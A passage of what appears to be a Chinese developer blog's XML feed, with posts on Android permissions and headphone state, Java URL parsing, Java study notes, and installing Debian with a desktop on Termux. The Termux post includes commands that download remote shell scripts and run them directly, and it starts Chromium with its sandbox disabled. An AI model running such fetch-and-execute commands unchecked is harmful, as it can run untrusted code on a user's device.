class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span>(hasPermission())&#123;</span><br><span class="line">        <span class="comment">//想要执行的操作</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        requestPermission();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    <span class="keyword">if</span>(Environment.isExternalStorageManager())&#123;</span><br><span class="line">        <span class="comment">//想要执行的操作</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"缺少必要权限"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions, <span class="keyword">int</span>[] grantResults)</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onRequestPermissionsResult(requestCode, permissions, grantResults);</span><br><span class="line">    <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">        <span class="comment">//想要执行的操作</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"缺少必要权限"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">hasPermission</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.R)</span><br><span class="line">        <span class="keyword">return</span> ContextCompat.checkSelfPermission(<span class="keyword">this</span>, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span>   Environment.isExternalStorageManager();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestPermission</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.R)</span><br><span class="line">        ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[] &#123; Manifest.permission.WRITE_EXTERNAL_STORAGE &#125;, <span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse(<span class="string">"package:"</span> + getPackageName()));</span><br><span class="line">        startActivityForResult(intent, <span class="number">10000</span>);</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"请授予必要权限"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客绑定域名</title>
      <link href="/2020/bo-ke-bang-ding-yu-ming/"/>
      <url>/2020/bo-ke-bang-ding-yu-ming/</url>
      
        <content type="html"><![CDATA[<p>起初，用Github Pages + Hexo搭个博客</p><a id="more"></a><p>就是为了自己随便记点东西，或者记点代码，用( <del>抄</del> )起来方便，就用默认的 gddhy.github.io 访问起来也方便，就没管域名什么的  </p><p>后来，用户名.github.io 访问被屏蔽了？？？<img src="/img/preloader.gif" data-original="/coolapk-emotion/11_yiwen.gif" alt>，提示</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.ConnectException: Failed to connect to gddhy.github.io/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></span><br></pre></td></tr></table></figure><p>一直这样放了好久还是这样，一直这样也不是个事，就整个域名搞一下吧，看到阿里云国际版上.cyou域名挺便宜，就先入了一年的，自己用，什么域名也无所谓了，用CNAME解析到Github Pages时，外网能访问，国内还是上面那样，再套上CloudFlare 后终于正常了  </p><p>已更换.net域名</p><blockquote><p>参考<a href="https://jakting.com/archives/hexo-setup-guide.html" target="_blank" rel="noopener">利用 Hexo + Github Pages (+ CloudFlare)，免费构建自己的加密安全博客</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓获取耳机状态</title>
      <link href="/2020/an-zhuo-huo-qu-er-ji-zhuang-tai/"/>
      <url>/2020/an-zhuo-huo-qu-er-ji-zhuang-tai/</url>
      
        <content type="html"><![CDATA[<p>在某些情况下需要获取耳机的连接状态</p><a id="more"></a><p>有线耳机/带dac的usb耳机</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);</span><br><span class="line">audioManager.isWiredHeadsetOn()</span><br></pre></td></tr></table></figure><p>需要权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MODIFY_AUDIO_SETTINGS"</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>来自<a href="https://blog.csdn.net/qinghua0706/article/details/8296276" target="_blank" rel="noopener">ALLD</a></p></blockquote><p>获取蓝牙耳机状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断蓝牙耳机是否连接</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isBluetoothHeadsetConnected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();</span><br><span class="line">    <span class="keyword">if</span> (BluetoothProfile.STATE_CONNECTED == adapter.getProfileConnectionState(BluetoothProfile.HEADSET)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BLUETOOTH"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BLUETOOTH_ADMIN"</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>来自<a href="https://blog.csdn.net/u012545728/article/details/99462873" target="_blank" rel="noopener">Androider_Zxg</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取当前媒体音量</span></span><br><span class="line"><span class="keyword">int</span> currentVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);</span><br><span class="line"><span class="comment">//设置媒体音量0(静音)</span></span><br><span class="line">audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, <span class="number">0</span>, AudioManager.FLAG_PLAY_SOUND);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java获取URL中的参数</title>
      <link href="/2020/java-huo-qu-url-can-shu/"/>
      <url>/2020/java-huo-qu-url-can-shu/</url>
      
        <content type="html"><![CDATA[<p>有时候我们需要在Java中解析URL，但是又用不了JSP里的那一套东西。  </p><a id="more"></a>  <p>这个函数能把URL里的GET参数放到对应的HashMap中，并且用异常处理，比较实用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; getQueryParams(String url) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; params = <span class="keyword">new</span> HashMap&lt;String, List&lt;String&gt;&gt;();</span><br><span class="line">        String[] urlParts = url.split(<span class="string">"\\?"</span>);</span><br><span class="line">        <span class="keyword">if</span> (urlParts.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            String query = urlParts[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (String param : query.split(<span class="string">"&amp;"</span>)) &#123;</span><br><span class="line">                String[] pair = param.split(<span class="string">"="</span>);</span><br><span class="line">                String key = URLDecoder.decode(pair[<span class="number">0</span>], <span class="string">"UTF-8"</span>);</span><br><span class="line">                String value = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">if</span> (pair.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    value = URLDecoder.decode(pair[<span class="number">1</span>], <span class="string">"UTF-8"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                List&lt;String&gt; values = params.get(key);</span><br><span class="line">                <span class="keyword">if</span> (values == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    values = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                    params.put(key, values);</span><br><span class="line">                &#125;</span><br><span class="line">                values.add(value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> params;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>转载自<a href="https://blog.csdn.net/jameshaper/article/details/8192647" target="_blank" rel="noopener">jameshaper</a>  </p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在Termux安装Debian和图形界面</title>
      <link href="/2020/termux-an-zhuang-linux/"/>
      <url>/2020/termux-an-zhuang-linux/</url>
      
        <content type="html"><![CDATA[<p>首先，你需要安装<a href="https://f-droid.org/zh_Hans/packages/com.termux/" target="_blank" rel="noopener">高级终端Termux</a> 已有请跳过<br><a href="vnc.zip">vnc软件</a></p><a id="more"></a><hr><p>安装Debian的命令  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c "$(curl -fsSL https://gddhy.net/data/install.sh)"</span><br></pre></td></tr></table></figure><p>旧版Termux还需要先安装curl  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install curl -y</span><br></pre></td></tr></table></figure><p>下次启动debian的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/debian_arm64/start-debian.sh</span><br></pre></td></tr></table></figure><p>移除debian系统的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/debian_arm64/remove-debian.sh</span><br></pre></td></tr></table></figure><hr><p><strong>安装图形化桌面环境</strong><br>进入debian系统后，输sh xfce4.sh或 ~/xfce4.sh 安装xfce4<br>输 ~/mate.sh 或 ~/lxde.sh 或 ~/lxqt.sh 安装其它三个桌面，<strong>四选一！千万不要一下子装两个桌面！</strong><br>若因网络原因，而导致xfce4脚本下载出错，请重新下载脚本。<br>在debian系统内输</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O xfce4.<span class="keyword">sh</span> http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/<span class="number">2</span>moe/AnLinux-Resources/master/Scripts/DesktopEnvironment/Apt/Xfce4/de-apt-xfce4.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> xfce4.<span class="keyword">sh</span> &amp;&amp; <span class="keyword">sh</span> xfce4.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>安装过程会提示选择键盘布局，选English再按回车即可。<br>初次启动vnc服务，会提示输6至8位的密码，输两遍。<br>Would you like to enter a view-only password ？<br>输n<br>输startvnc或vncserver-start启动vnc服务，输stopvnc或vncserver-stop停止vnc服务。<br>至于这两个有什么区别？你可以自己去体会。<br>完成后，打开vnc viewer客户端，输localhost:5901   </p><p>如果你想要在启动debian时自动开启vnc服务，你可以termux原系统内输以下命令，注意这里是termux不是debian。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/debian_arm64/debian-fs/root ; sed -i  "2 astartvnc" .bashrc</span><br><span class="line">echo -e "am start com.realvnc.viewer.android/com.realvnc.viewer.android.app.ConnectionChooserActivity\n~/debian_arm64/start-debian.sh" &gt; startvnc ; echo -e "pkill Xtightvnc\npkill gpg-agent\npkill ssh-agent" &gt; stopvnc ; chmod +x * ; mv -f startvnc stopvnc $PREFIX/bin/</span><br></pre></td></tr></table></figure><p>这样子在termux里输startvnc就能同时启动vnc客户端+debian+vnc服务端了。   </p><p>还原命令为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i 's/startvnc/#&amp;/' ~/debian_arm64/debian-fs/root/.bashrc ; cd $PREFIX/bin/ ; rm -f startvnc stopvnc</span><br></pre></td></tr></table></figure><hr><p>安装chromium浏览器 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y chromium fonts-wqy-* ; chromium --no-sandbox</span><br></pre></td></tr></table></figure><p> 启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chromium --no-sandbox</span><br></pre></td></tr></table></figure><p>安装LinuxQQ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O linuxqq.deb https://qd.myapp.com/myapp/qqteam/linuxQQ/linuxqq_2.0.0-b1-1024_arm64.deb ; apt install -y ./linuxqq.deb</span><br></pre></td></tr></table></figure><blockquote><p>转载自酷安@<a href="https://www.coolapk.com/feed/14869765?shareKey=NGYxYTcyODY3ODU1NWUyNzc0NWU~&shareUid=778415&shareFrom=com.coolapk.market_10.0.1" target="_blank" rel="noopener">萌系生物研究员</a> |  <a href="https://www.lanzous.com/b08f04a3g" target="_blank" rel="noopener">命令、文件 密码:ehbz</a>  </p></blockquote><hr><p>附Termux功能拓展/美化<a href="https://github.com/zsxwz/zstermux/blob/master/README.md" target="_blank" rel="noopener">zstermux</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c "$(curl -fsSL https://raw.githubusercontent.com/zsxwz/zstermux/master/install.sh)"</span><br></pre></td></tr></table></figure><p>时间久远可能已失效，可以使用这个安装<a href="https://www.sqlsec.com/2020/04/termuxlinux.html" target="_blank" rel="noopener">Android Termux 安装 Linux 就是这么简单 | 国光</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome离线安装包下载</title>
      <link href="/2019/xia-zai-chrome/"/>
      <url>/2019/xia-zai-chrome/</url>
      
        <content type="html"><![CDATA[<p><a href="https://dl.google.com/tag/s/installdataindex/update2/installers/ChromeStandaloneSetup64.exe" target="_blank" rel="noopener">Win64位</a> | <a href="https://dl.google.com/tag/s/installdataindex/update2/installers/ChromeStandaloneSetup.exe" target="_blank" rel="noopener">Win32位</a><br>链接始终为最新版  </p><a id="more"></a>  <p><a href="https://www.google.cn/chrome/" target="_blank" rel="noopener">Chrome主页</a>  </p><p><a href="https://dream.ren/tool/chrome/" target="_blank" rel="noopener">Chrome离线包集合</a> 来自<a href="https://dream.ren/" target="_blank" rel="noopener">追梦人 Dream.ren</a></p><hr><p>谷歌访问助手，只提供基础的谷歌访问服务<br><a href="https://github.com/haotian-wang/google-access-helper" target="_blank" rel="noopener">Github</a> | <a href="google-access-helper-2.3.0.zip">直接下载(v2.3.0)</a><br>进 <code>chrome://extensions</code> 打开开发者模式或查看<a href="https://github.com/haotian-wang/google-access-helper/blob/v2.3.0/README.md" target="_blank" rel="noopener">README</a> 使用  </p><hr><p>关于Chrome浏览器的小恐龙彩蛋<br>Chrome浏览器输入 <code>chrome://dino</code> 即可打开<br>其他浏览器可以在此打开：<a href="https://lmk123.github.io/t-rex-runner/" target="_blank" rel="noopener">点击查看</a> | <a href="https://github.com/lmk123/t-rex-runner" target="_blank" rel="noopener">Github</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记</title>
      <link href="/2019/java-bi-ji/"/>
      <url>/2019/java-bi-ji/</url>
      
        <content type="html"><![CDATA[<h4 id="1-关于包"><a href="#1-关于包" class="headerlink" title="1. 关于包"></a>1. 关于包</h4><ol><li>概念：在程序中是一种逻辑概念，在Windows中对应于文件夹（或目录）  </li><li>包具有层次结构，不同包间用“.”分开，这种层次结构对应于文件夹的层次结构  </li><li>关键字是package，在程序中定义包的语句只能出现一次  </li></ol><a id="more"></a>  <h4 id="2-Java中的访问控制方式：4种"><a href="#2-Java中的访问控制方式：4种" class="headerlink" title="2. Java中的访问控制方式：4种"></a>2. Java中的访问控制方式：4种</h4><ol><li>public、private、protected和默认  </li><li>针对类，只能使用public和默认  </li><li>权限最大的public，最小的private</li><li>子类能继承父类中除了private之外的所有成员变量和成员方法（不包括构造方法）  </li></ol><h4 id="3-final关键字：最终的"><a href="#3-final关键字：最终的" class="headerlink" title="3. final关键字：最终的"></a>3. final关键字：最终的</h4><ol><li>可以用来修饰成员变量，通常称为常量  </li><li>可以修饰成员方法，能被继承，但不能被重写  </li><li>可以修饰类，能创建对象，不能被继承  </li></ol><h4 id="4-在Java语言中，所有类的公共父类是Object（对象类）"><a href="#4-在Java语言中，所有类的公共父类是Object（对象类）" class="headerlink" title="4. 在Java语言中，所有类的公共父类是Object（对象类）"></a>4. 在Java语言中，所有类的公共父类是Object（对象类）</h4><h4 id="5-支持的字符集"><a href="#5-支持的字符集" class="headerlink" title="5. 支持的字符集"></a>5. 支持的字符集</h4><ul><li>ASCⅡ码：一个字符占1字节（8bits），汉字和英文字符所占不同  </li><li>Unicode：一个字符占两个字节，对汉字和英文字符相同对待（Java）  </li></ul><h4 id="6-类的继承："><a href="#6-类的继承：" class="headerlink" title="6. 类的继承："></a>6. 类的继承：</h4><ol><li>Java语言支持单重继承  </li><li>关键字：extends  </li><li>子类可以根据需要添加自己的成员变量和成员方法  </li><li>子类可以重写父类中的某成员方法  </li><li>状态=&gt;成员变量  </li></ol><h4 id="7-异常："><a href="#7-异常：" class="headerlink" title="7. 异常："></a>7. 异常：</h4><ol><li>是指程序运行中的错误，而不是指逻辑错误和语法错误  </li><li>多数异常能通过编译  </li><li>异常不是程序预先设计好的，而异常处理则应该是预先设计好的  </li></ol><h4 id="8-Java语言中的控制台命令"><a href="#8-Java语言中的控制台命令" class="headerlink" title="8. Java语言中的控制台命令"></a>8. Java语言中的控制台命令</h4><ul><li>编译命令：javac</li><li>运行命令：java</li><li>源文件：.java</li><li>编译后文件：.class (二进制文件）</li></ul><h4 id="9-关于方法的重写（覆盖）和重载"><a href="#9-关于方法的重写（覆盖）和重载" class="headerlink" title="9. 关于方法的重写（覆盖）和重载"></a>9. 关于方法的重写（覆盖）和重载</h4><ol><li>重写是指在子类中可以把父类中的某成员方法的方法体重新设计  </li><li>重载是指在某类中允许出现若干个 <code>同名</code> 方法，但不允许出现相同方法  </li></ol><h4 id="10-数组"><a href="#10-数组" class="headerlink" title="10. 数组"></a>10. 数组</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>定义了含有3个元素的一维数组并为其初始化  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>定义了含有6个元素的二维数组并为其初始化  </p><ul><li>元素的默认值是0  </li></ul><h4 id="11-关于Java语言的特性："><a href="#11-关于Java语言的特性：" class="headerlink" title="11. 关于Java语言的特性："></a>11. 关于Java语言的特性：</h4><ol><li>是完全面向对象的程序设计语言  </li><li>支持跨平台，是借助于Java VM来实现  </li><li>支持多线程  </li><li>程序安全性高  </li><li>支持分布式计算  </li></ol><h4 id="12-导入包中的信息，使用import"><a href="#12-导入包中的信息，使用import" class="headerlink" title="12. 导入包中的信息，使用import"></a>12. 导入包中的信息，使用import</h4><ul><li>可以导入包中的类、接口、异常、错误  </li><li>import语句在程序中可以出现多次  </li></ul><h4 id="13-抽象类、抽象方法："><a href="#13-抽象类、抽象方法：" class="headerlink" title="13. 抽象类、抽象方法："></a>13. 抽象类、抽象方法：</h4><ol><li>关键字：abstract  </li><li>抽象方法只包含方法的声明，而没有方法体，需要在子类中实现  </li><li>抽象类可以包含0个或任意个抽象方法  </li></ol><h4 id="14-整形常量"><a href="#14-整形常量" class="headerlink" title="14. 整形常量"></a>14. 整形常量</h4><ul><li>整形常量从进制看，分十进制、八进制、十六进制三种  </li><li>八进制：数字0开头，例：0123， <del>059</del>   </li><li>十六进制：以0x开头，例：0x123、0XAB<br>0x10 = (16)⑽  </li></ul><h4 id="15-数组元素下标从0开始"><a href="#15-数组元素下标从0开始" class="headerlink" title="15. 数组元素下标从0开始"></a>15. 数组元素下标从0开始</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line"><span class="comment">//元素 a[0]、a[1]、a[2]</span></span><br></pre></td></tr></table></figure><h4 id="16-主方法main"><a href="#16-主方法main" class="headerlink" title="16. 主方法main"></a>16. 主方法main</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br></pre></td></tr></table></figure><ul><li>static 表示储存类别，静态  </li><li>void 表示类型标识符，空类型或无类型  </li><li>String 表示字符串类  </li></ul><h4 id="17-构造方法"><a href="#17-构造方法" class="headerlink" title="17. 构造方法"></a>17. 构造方法</h4><ol><li>方法名必须与所在类名相同，无返回类型  </li><li>是为对象初始化而设计的</li><li>是被系统调用的  </li><li>可以出现在 new 之后，也可以用this和super来调用  </li></ol><h4 id="18-Java支持的循环语句"><a href="#18-Java支持的循环语句" class="headerlink" title="18. Java支持的循环语句"></a>18. Java支持的循环语句</h4><ul><li>有 do-while、while、for  </li><li>do-while：循环体至少执行一次  </li><li>while：循环体有可能一次也不执行  </li><li>for：循环次数已确定的问题  </li></ul><h4 id="19-整数类型"><a href="#19-整数类型" class="headerlink" title="19. 整数类型"></a>19. 整数类型</h4><table><thead><tr><th align="center">类型</th><th align="center">字节数</th><th align="center">取值范围</th></tr></thead><tbody><tr><td align="center">byte</td><td align="center">1B</td><td align="center">-128~127</td></tr><tr><td align="center">int</td><td align="center">4B</td><td align="center">±20亿左右</td></tr><tr><td align="center">long</td><td align="center">8B</td><td align="center">-</td></tr></tbody></table><ul><li>布尔类型：boolean ，值true/false  </li></ul><h4 id="20-多分支选择"><a href="#20-多分支选择" class="headerlink" title="20. 多分支选择"></a>20. 多分支选择</h4><ol><li>关键字switch、case、break、default  </li><li>case后接的是常量，类型：整型、字符型  </li><li>break充当某情况的出口，如果多个case执行同一个出口，则每个case后的语句依次执行  </li></ol><h4 id="21-面向对象中有两个基本概念：对象、类"><a href="#21-面向对象中有两个基本概念：对象、类" class="headerlink" title="21. 面向对象中有两个基本概念：对象、类"></a>21. 面向对象中有两个基本概念：对象、类</h4><ol><li>对象：以类为前提，是类的 <code>实例</code>   </li><li>类：是对若干个性质相似的对象其共性的一种描述，关键字是class  </li></ol><h4 id="22-实型常量"><a href="#22-实型常量" class="headerlink" title="22. 实型常量"></a>22. 实型常量</h4><ol><li>从表现形式上看，分成小数形式和指数形式  <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.67e5</span>=&gt;<span class="number">5.68</span>*<span class="number">10</span>^<span class="number">5</span></span><br></pre></td></tr></table></figure></li></ol><p>规则：e前必须要有数字，e后必须是整数  </p><ol start="2"><li>直接写出的实型常量，如3.14，系统默认为double常量  </li></ol><h4 id="23-异常的处理机制：捕获-抛出"><a href="#23-异常的处理机制：捕获-抛出" class="headerlink" title="23. 异常的处理机制：捕获/抛出"></a>23. 异常的处理机制：捕获/抛出</h4><ul><li>捕获：try … catch … finally  <ul><li>try对应的语句块可能会产生异常  </li><li>catch对应的语句块是对异常进行处理，一个try可以对应多个catch  </li><li>finally对应的语句块起到过度作用  </li></ul></li><li>抛出：throws<br>是把异常从当前方法抛出到上级方法  </li><li>捕获异常是积极的处理方式<br>抛出异常是消极的处理方式</li></ul><h4 id="24-关于长度"><a href="#24-关于长度" class="headerlink" title="24. 关于长度"></a>24. 关于长度</h4><ol><li><p>数组的长度属性：length，方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数组名.length</span><br><span class="line"><span class="comment">//元素个数</span></span><br></pre></td></tr></table></figure></li><li><p>字符串长度：length()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象名.length()</span><br><span class="line"><span class="comment">//字符个数</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="25-面相对象的特性"><a href="#25-面相对象的特性" class="headerlink" title="25. 面相对象的特性"></a>25. 面相对象的特性</h4><ol><li>继承性：子类继承于父类</li><li>封装性：某部分内部实现细节对外界隐藏</li><li>多态性：属性取值的多态和功能实现的多态</li></ol><h4 id="26-接口及其子类"><a href="#26-接口及其子类" class="headerlink" title="26. 接口及其子类"></a>26. 接口及其子类</h4><ol><li>接口是特殊的抽象类，定义的关键字是 <code>interface</code> ，包含两类内容：常量和抽象方法</li><li>通过接口的子类来实现接口中的抽象方法，关键字是 <code>implements</code> ，一个子类可以实现多个接口</li></ol><h4 id="27-子类对象的创建过程"><a href="#27-子类对象的创建过程" class="headerlink" title="27. 子类对象的创建过程"></a>27. 